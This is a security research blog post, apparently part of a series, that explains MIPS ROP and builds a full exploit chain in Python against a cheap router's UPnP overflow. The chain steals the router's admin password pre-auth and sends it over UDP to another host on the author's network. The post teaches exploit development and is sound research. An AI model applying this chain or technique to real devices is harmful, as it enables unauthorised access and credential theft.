---
published: true
title : "🐛️ Analysing a Dirt-cheap Router: MIPS Code Execution with ROP"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Python
  - Debug Interfaces
  - RTOS
  - Hardware
tagline: "Once a bug has been found, it is a great exercise to exploit the bug and see how far you can take it. We have a couple of ways we can exploit the UPnP overflow we found in the previous blog - using ROP to get code execution, and injecting shellcode. This blog will focus on utilising ROP to get the router to misbehave."
excerpt : "In this blog, we will use ROP to turn the overflow we found in the previous blog into code execution."
header:
  teaser: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_image: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_filter: 0.4
  #caption: "Photo credit: [**Unsplash**](https://unsplash.com)"
---

# ROP (Return-Oriented Programming)

Before we can start ropping around, we need to know what it actually it, and why it works. In the previous blog, I explained a bit about how stack-based buffer overflows can be turned into code execution by overwriting the return address, and how shellcode can be used to control the target. However, if NX (non-executable stack) is enabled, you cannot write shellcode to the stack and execute it - bummer. 

What you can do however is utilise code which is already on the device, one of these techniques is ROP (Return-Oriented Programming). This works by finding 'gadgets' that contain desirable instructions, and are usually found at the end of functions (their last few instructions, a.k.a. the function epilogue). We use the end of functions so that we can maintain control of the program counter/return address, we can craft a chain containing gadget addresses in the correct locations to be loaded into the return address register (*ra* on MIPS) from the stack, allowing us to chain together our specified gadgets.

Tools such as [Ropper](https://github.com/sashs/Ropper) can be used to search for desirable gadgets, and tools like [angrop](https://github.com/angr/angrop) can even leverage symbolic execution to generate ROP-chains for you! 

![rop_gadgets.png]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_3/rop_gadgets.png)

Luckily in this context there are no mitigations, so we should be able to run shellcode on the device; however, for the sake of completeness, I am going to avoid shellcode for now and see if I can get the router to do something interesting using only ROP - which should be a fun challenge.

![rop_joke.png]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_3/rop_joke.png)

# MIPS

We need to know a bit about the target architecture before we can start finding gadgets and building our chain. In this case, our target uses MIPS, which comes with its own set of quirks.

## Registers

We can see a dump of the registers when the router crashes, knowledge of what these registers are for will prove very useful when developing our rop-chain - I'll only explain the most useful ones here.

![registers.png]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_3/registers.png)

- ***a0-3*** : Function arguments - when you call `printf("%s", "hello")`, the memory address of "%s" will be in *a0*, and the address of "hello" will be in *a1*.
- ***v0-1*** : Function return values - when a function is called, you can expect the return values to be in these registers. E.g. if you called *strlen*, the length would be found in *v0* after the function returned.
- ***t0-9*** : Temporary caller saved registers - if the instructions have stuck to the MIPS calling convention, these are not guaranteed to be the same after a function return.
- ***s0-7*** : Callee saved registers - these are guaranteed to be the same after a function return, usually done by saving them to the stack during the function prologue, and restoring them during the epilogue.
- ***sp*** : This usually points to the current top of the stack, which is used for managing function calls and local variables.
- ***pc*** : The program counter register stores the memory address of the next instruction to be executed -  we want to control this.
- ***ra*** : The return address is the value stored in the program counter register before a function call, which indicates the address to which the program should return after the function call is completed - we can overwrite this to gain control.

## Instructions

***Note:*** In MIPS assembly, if brackets are around a register value, e.g. ($s0), the instruction is refering to the value pointed to by the memory address strored in the registers (indirect addressing) - kind of like dereferencing a pointer in C. 

- `move $dst, $src` : Moves the contents of *$src* to *$dst* - this is obviously useful if you have a gadget for a specific register, say *$a0*, but the value is in *$s0*, you would find a gadget contianing `move $a0, $s0`.
- `lw $dst, offset($src)` : Loads a word from memory located at *$src* + offset into *$dst* - This is usually the instruction that gets our foot in the door, as it loads some stack pointer offset into *$ra* (`lw $ra, 4($sp)` for example)
- `sw $src, offset($dst)` : The store word instruction basically does the opposite of `lw`, it stores the value in *$src* at the memory pointed to by *$dst* + offset.
- `addiu $dst, $src, num` : The add immediate unsigned instruction is useful as you can adjust the values in registers if needed - it can also be an indirect way of moving values around registers if *$dst* is not also *$src*.
- `jalr $target` : Jump and link register allows jumps to addresses stored within registers, e.g., if *$target* is a register containing an address to a function, we can use `jalr` to call that function. Note that this instruction also sets *$ra* to be *$pc + 4* when called.

Thats pretty much the most important instructions for the simple chains I will construct in this blog (one of the perks of RISC), in more constrained environments with limited gadgets, you will need to be much more creative to do anything useful.

## Branch Delay Slot

MIPS has what can be a pretty annoying feature called a branch delay slot. The branch delay slot is the instruction that immediately follows a branch or jump instruction (including `jalr`), which is always executed regardless of whether the branch is taken or not.

The purpose of the branch delay slot is to improve performance by allowing the instruction pipeline to continue executing instructions while the branch or jump instruction is being resolved. By executing the branch delay slot instruction, the pipeline is kept full and the processor can make better use of its execution units.

When constructing a chain, it is important to not forget about this feature, otherwise you can spend ages making a chain only to realise that your very important SOCK_DGRAM stored in *$a0* gets OR'd by `ori $a1, $a1, 0x6934` before the jump. Definitely not speaking from experience.

![sendto_meme.jpg]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_3/sendto_meme.jpg)

## What about functions with > 4 arguments?

There are two ways that this is usually handled in MIPS:
- Store the arguments on the stack, and pull them from the stack in the function
- Load them into some other registers

In the case of this device, they use the latter, specifically the *$tx* registers. So we simply need to put our 5th argument into *$t0*, 6th into *$t1*, etc.

# Prerequisites

## Looking For Gadgets

When constructing the chain, we need to ensure that we do not lose control of the *$ra*/*$pc*. We can ensure control is maintained by using gadgets that load the return address off of the stack (which we can set to be the next gadget we want to load). We should also be careful of the registers that we 'clobber' in our gadgets, which is a term for the registers impacted by the gadgets. 

We also don't really want gadgets that use a huge chunk of stack space, e.g., a gadget that loads the return address from *0x1000($sp)*, as that would fill our payload with loads of padding.

An example of a good gadget is the following:

```
lw $v0, ($v0); 
lw $ra, 4($sp); 
jr $ra; 
addiu $sp, $sp, 8; 
```

- Loads the return address from *4($sp)* so control of the return address is maintained
- Uses 8 bytes of payload space
- Doesn't clobber any registers except the intended register, *$v0*

I mentioned Ropper earlier, but I thought I would knock together a quick set of examples I found useful:
- `ropper --arch MIPS --file chaneve_router.bin --search "lw \$a0" --all` : Finds all gadgets containing `lw $a0, X($X)` instruction, including repeated gadgets
- `ropper --arch MIPS --file chaneve_router.bin --search "move \$a1, \$s?"` : Finds all gadgets that move any *s* register into *$a1*
- `ropper --arch MIPS --file chaneve_router.bin --search "move \$??, \$sp" --inst-count 10` : Finds all gadgets that move the stack pointer to a register, with a maximum of 10 instructions in the gadget (instead of the default max of 6)

## Finding functions

In some binaries without symbols, finding functions can be pretty difficult - especially if things like debug strings have been stripped out or source code is not available. Luckily for us, there are plenty of debug strings that can be used to identify loads of primitive C functions, such as *socket*, *sendto*, *recvfrom*, *setsockopt*, etc. 

I also identified other functions such as *sleep*, *malloc*, and *free* by googling some debug strings and finding source code online, as this is a Realtek SDK it is pretty simple to find some matching source code. Then it is just a matter of comparing it against what you have in Ghidra, and you can easily name plenty of functions.

# Building the Chain

Now that we know some fundamentals of MIPS, how to do ROP, and how to find good gadgets, we can get to work on the chain.

## Goal

The goal of the chain is to send the admin password of the router to some other device on the network via UDP socket. So we basically need to execute the following code in C using ROP:

```c
int sockfd;
struct sockaddr_in server_addr;
char* message = malloc(sizeof(char) * 100); // can be some heap address in our chain

// create a UDP socket
sockfd = socket(AF_INET, SOCK_DGRAM, 0);

// Get the admin password from the config
config_get(0x1010200, message);

// set up server address
memset(&server_addr, 0, sizeof(server_addr));
server_addr.sin_family = AF_INET;
server_addr.sin_port = htons(4900);
server_addr.sin_addr.s_addr = inet_addr("192.168.188.1");

// send message to server
sendto(sockfd, message, strlen(message), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
```

## Chain Breakdown

We begin the chain by creating a payload that will trigger the overflow, we can use the offsets we found in the previous blog to work out what registers will be filled - we don't care about what is in them right now, so we can just fill them with `0xdeadbeef`. *p32* just packs the addresses correctly so they go into the registers as we would expect.

```python
# Function address
sendto_addr = 0x80128bc4
socket_addr = 0x801293d0
sleep_addr = 0x8019abac
connect_addr = 0x80129028
strlen_addr = 0x801a717c

# Padding
chain = b'a'*132

# Add the strings to the sX registers, and set the ra to first gadget
chain += p32(0xdeadbeef) # s0
chain += p32(0xdeadbeef) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0xdeadbeef) # s3
chain += p32(0x11e670 + base_address) # ra
```

### socket

`int socket(int domain, int type, int protocol);`

The *socket* function takes 3 arguments - *domain*, *type*, and *protocol*. We want *domain* to be *AF_INET* which corresponds to a value of 2. Then we want type to be *SOCK_DGRAM*, which is also 2. The final argument is then 0 as we want the OS to determien the protocol based on the *domain* and *type* values we provided. The code below adds gadgets that set these values:

```python
## Set first argument for socket to 2
# 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += b'b'*4
chain += p32(0x172e0c + base_address) # ra

## Set second argument for socket to 2 
# Set a1 to be 0
# 0x00172e0c: move $a1, $zero; lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
chain += b'b' * 0xc
chain += p32(0x115428 + base_address)

# Add 2 to a1
# 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
chain += p32(0xdeadbeef) # s0
chain += p32(0x6d42c + base_address)

## Set third argument for socket to 0
# 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
chain += b'b' * 4
chain += p32(0x57864 + base_address) # ra
```

To get 2 into *$a2*, a single gadget didn't exist that could achieve this, so I chained a couple of nicer gadgets together to achieve the same result. 

It is worth highlighting that the *$sp* is at the 'top' of the gadget - let me explain. For the 'add 2 to a1' gadget for example, *$s0* is being loaded at an offset of 0 from *$sp* with the `lw $s0, ($sp)` instruction, and then *$ra* is being loaded at an offset of 4 from *$sp* with `lw $ra, 4($sp)`. The loaded *$s0* is above *$ra* in the chain construction, so you can imagine the stack pointer being at the start of *$s0*. I've found that to be the easiest way to visualise the chain as you build it, and nicely compartmentalises each gadget used in the chain. 

Now, we need to actually call *socket*, we know the address of socket, so we can simply load the address of this function into a register, and then use a `jalr` call to call the function at the address in our register. After looking through a few gadgets, *$v0* was the best candidate, so the following gadgets were chained together to call *socket*:

```python
# Load address of socket into v0
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
chain += p32(socket_addr) # v0 - socket address
chain += b'b' * 8
chain += p32(0x133d58 + base_address) # ra

# Call socket(2, 1, 0) and regain control
# 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
chain += b'b' * 0x18
chain += p32(sockfd_addr) # s0
chain += p32(0xdeadbeef) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0x185e38 + base_address) # ra
```

That 2nd gadget is not the prettiest as it uses a lot of padding, but the only other gadget that contained the `jalr $v0;` instruction immediately wiped out the *sockfd* returned by *socket*, which is pretty important! Sometimes you need to accept not all gadgets will be pretty!

If you look at the last gadget, we set the value of *$s0* to be *sockfd_addr*, which is an address that we will be using to store our *sockfd* returned by *socket* for use later. We can then use the following gadget to store *$v0* (containing our return value) to *($s0)*:

```python
# save the socket file descriptor for use later, might not use but oh well
# 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += p32(0x80236c4c - 4) # s0 (0x1010200 address)
chain += p32(0x153d0 + base_address) # ra
```

### config_get

Next, we need to get the value of the admin password from the config that will be sent. By tracing through the calls make by the command line `cfg get` function, I found the function responsible for pulling these values from the config. All we need to provide this function is the ID of the value we want, and where to store it. 

The only annoying thing about the address of the *config_get* function is that it is at address *0x800089e4*, which would contain a null byte if we sent it as is, so we will need to handle this with our gadgets. Lets first set the arguments:

```python
# Set a0 to be the id of the admin password
# 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
chain += p32(0x800089e4 + 0x7b58) # s0
chain += p32(0x11e568 + base_address)

# 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
chain += p32(pwd_buffer)
chain += b'b' * 0x8
chain += p32(0x137960 + base_address)
```

As you can see, we have set *$a0* to contain the address of 0x1010200 (we set *$s0* to be the address of 0x1010200 - 4 earlier, so this is why 4($s0) get the correct address). We also set *$a1* to be the address of the buffer we want to store the password. 

We have also set *$s0* to contain the address of the *config_get* function + 0x7b58, this means we can send it as it no longer contains a null byte. We can use the following gadget to subtract the extra we added on:

```python
## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
# 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += p32(0xdeadbeef) # s0
chain += p32(0x15114 + base_address) # ra
```

With the correct address in *$v0*, we can now use a similar `jalr` containing gadget to call the *config_get* function - but as we are not worried about the return value, we can use the cleaner gadget that clears *$v0*:

```python
## Now call config get
# 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
chain += b'b' * 0x4
chain += p32(0x19bc70 + base_address) # ra
```

### strlen

`size_t strlen(const char *str)`

With the admin password safely stored in our buffer, we can now work out how many bytes we need to send over the socket. All we need to do is move the address of our buffer into *a0*, and call *strlen*. We start by populating *$a0*:

```python
# Regain control of s0
# 0x0019bc70: lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += p32(pwd_buffer) # s0
chain += p32(0xb018c + base_address) # ra

# Move pwd buffer address into a0
# 0x000b018c: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += p32(0xdeadbeef) # s0
chain += p32(0x57864 + base_address) # ra
```

Then we load the address of *strlen* into *v0*, and call the function using the ugly `jalr` gadget as we care about the return value - you should remember this from earlier:

```python
# Load address of strlen into v0
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
chain += p32(strlen_addr) # v0 - strlen address
chain += b'b' * 8
chain += p32(0x133d58 + base_address) # ra

# Call strlen and regain control
# 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
chain += b'b' * 0x18
chain += p32(0xdeadbeef) # s0
chain += p32(0xdeadbeef) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0x166168 + base_address) # ra
```

So at this point, we have the length of the password in *$v0*. I hate to spoil the next function call we are going to make, but its *sendto*, which takes the number of bytes to send as its 3rd argument. Therefore, we need to move the contents of *$v0* into *$a2*:

```python
# 0x00166168: move $v1, $v0; lw $ra, 4($sp); move $v0, $v1; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
chain += b'b' * 4
chain += p32(0x18f044 + base_address)

# 0x0018f044: move $a2, $v1; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
chain += b'b' * 0xc
chain += p32(0x1a9f9c + base_address)
```

As you can see, I needed to use *$v1* as a middle man as there were no useful gadgets that moved *$v0* into *$a2*. However, we now have one of our *sendto* arguments in the right place.

### sockaddr_in

```c
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
```

We need to create a *sockaddr_in* struct containing the port and IP address we would like to send the message to. As we cannot send null bytes, we will need to find some memory that we can copy containing the bytes we need. 

To indicate *sin_family* AF_INET in our struct, the first 2 bytes need to be *0x0* and *0x2*. The next 2 bytes specify the port number, so anything works. I found *0x0* *0x2* *0x13* *0x24* in the firmware image - so we will be sending messages over port 4900. 

All we need to do now to have a valid *sockaddr_in* struct is append the IP address. As most of this is done within the *sendto* call construction, I will include the gadgets used in the next section.

### sendto

`ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);`

As you can see above, we have 6 argument to populate, meaning we will be loading values into *$t0* and *$t1*. Lets start with the easy arguments and get the *sockfd* we stored earlier into *$a0*:

```python
# Load sockfd address into v0
# 0x001a9f9c: lw $v0, ($sp); lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
chain += p32(sockfd_addr) # v0
chain += b'b' * 8
chain += p32(0xdeadbeef) # s0
chain += p32(sockaddr_addr) # s1
chain += p32(0x1a46dc + base_address) # ra

# Get the actual value of sockfd into v0
# 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
chain += b'b' * 4
chain += p32(0x1746c8 + base_address)

# Move sockfd to a0 for connect
# 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += p32(0xdeadbeef) # s0
chain += p32(0x11e568 + base_address) # ra
```

Notice how we needed the actual value of *sockfd* to be in *$a0* and not its address, we used the `lw $v0, ($v0)` gadget to achieve this, and then moved it into *$a0*.

We can then set *$a1* to be the address of the password buffer, and *$a3* to 0 as we don't need any flags set:

```python
# Move admin pwd buffer into a1
# 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
chain += p32(pwd_buffer) # a1 (address of pwd)
chain += b'b' * 0x8
chain += p32(0xbb6e4 + base_address) # ra

# Set a3 to be zero (flags)
# 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
chain += b'b' * 0xc
chain += p32(0x57864 + base_address) # ra
```

With these arguments set, we can finally construct the *sockaddr_in* struct with the following gadgets - the comment do a pretty good job explaining what is happening. We are basically copying the memory address with the desired values (*0x0* *0x2*) I mentioned earlier, and appending the IP address of the target:

```python
# s1 has our sockaddr address, load address of afinet into v0
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
chain += p32(harcdoded_afinet) # v0
chain += b'b' * 8
chain += p32(0x1a46dc + base_address) # ra

# Load hardcoded afinet stuff into v0 (currently has the address)
# 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
chain += b'b' * 4
chain += p32(0x13e134 + base_address) # ra

# Store the afinet stuff at our sockaddr struct
# 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
chain += b'b' * 4
chain += p32(0xdeadbeef) # s0
chain += p32(sockaddr_addr + 4) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0xdeadbeef) # s3
chain += p32(0x57864 + base_address) # ra

# Load the IP address into v0
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
chain += b'b' * 8
chain += p32(0x13e134 + base_address) # ra

# Store the loaded IP address at sockaddr + 4
# 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
chain += b'b' * 4
chain += p32(0xdeadbeef) # s0
chain += p32(0xdeadbeef) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0xdeadbeef) # s3
chain += p32(0x57864 + base_address) # ra
```

With our *sockaddr_in* struct completed and stored, we can now work on moving it into *$t0*:

```python
## Load t0 value into v0
# Load v0 from stack
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
chain += p32(sockaddr_addr) # v0 - sockaddr address
chain += b'b' * 8
chain += p32(0x15d20c + base_address) # ra

# Move sockaddr from v0 into t0 (load v0 from stack, move into t0) 
# 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
#   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
chain += b'b' * 0xc
chain += p32(0xdeadbeef) # s0
chain += p32(0xdeadbeef) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0xdeadbeef) # s3
chain += p32(0xdeadbeef) # s4
chain += p32(0xdeadbeef) # s5
chain += p32(0xdeadbeef) # s6
chain += p32(0xdeadbeef) # s7
chain += p32(0x1895cc + base_address) # ra
```

That last gadget is very ugly, but gadgets that move values into *$t0* are pretty limited so I had to take what I could get.

Now we can finally complete the arguments by putting 0x20 into *$t1*:

```python
# Move 0x20 into t1
# 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
chain += b'b' * 0x20
chain += p32(0xdeadbeef) # s0
chain += p32(0xdeadbeef) # s1
chain += p32(0xdeadbeef) # s2
chain += p32(0x57864 + base_address) # ra
```

With all the arguments in place, we can finally call the function - you know the drill by now:

```python
# Load address of sendto into v0
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
chain += p32(sendto_addr) # v0 - sendto address
chain += b'b' * 8
chain += p32(0x15114 + base_address) # ra

# Call sendto and regain control
# 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
chain += b'b' * 4
chain += p32(0xdeadb33f) # ra
```

And thats the entire chain completed!

## Does it work?

Setting up Wireshark to view the traffic coming to and from the router, we can see the malicious SSDP payload being sent to the router, and the router responding with a UDP packet on port 4900 containin the admin password : *Aliexpress4Eva*!

![pwned.png]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_3/pwned.png)

# Conclusion

So, we managed to retrieve the admin password pre-auth through an overflow we exploited using ROP - pretty cool! I've learned a lot about MIPS through this exercise, and although it's not the most common platform to create your first buffer overflow exploit - it doesn't matter because it worked!

![im_in.png]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_3/im_in.png)

